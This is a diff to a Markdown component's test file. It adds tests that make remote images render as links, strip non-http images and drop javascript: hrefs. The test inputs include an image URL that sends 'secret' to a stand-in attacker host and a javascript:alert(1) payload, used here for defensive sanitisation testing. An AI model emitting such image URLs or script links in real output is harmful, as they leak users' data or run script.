@@ -38,6 +38,25 @@ describe('Markdown', () => {
     expect(screen.getByText('bold').tagName).toBe('STRONG');
   });
 
+  test('remote images render as links, never as images', () => {
+    const { container } = render(<Markdown text={'![chart](https://evil.example/?d=secret)'} />);
+    expect(container.querySelector('img')).toBeNull();
+    const link = screen.getByRole('link', { name: 'chart' });
+    expect(link).toHaveAttribute('href', 'https://evil.example/?d=secret');
+  });
+
+  test('non-http images render as their alt text only', () => {
+    const { container } = render(<Markdown text={'![local pic](file:///C:/x.png)'} />);
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.querySelector('a')).toBeNull();
+    expect(screen.getByText('local pic')).toBeInTheDocument();
+  });
+
+  test('javascript: links lose their href', () => {
+    const { container } = render(<Markdown text={'[x](javascript:alert(1))'} />);
+    for (const a of container.querySelectorAll('a')) expect(a.getAttribute('href') ?? '').not.toMatch(/javascript:/i);
+  });
+
   test('code blocks get a copy button', () => {
     render(<Markdown text={'```csharp\nvar x = 1;\n```'} />);
     expect(screen.getByRole('button', { name: 'Copy code' })).toBeInTheDocument();
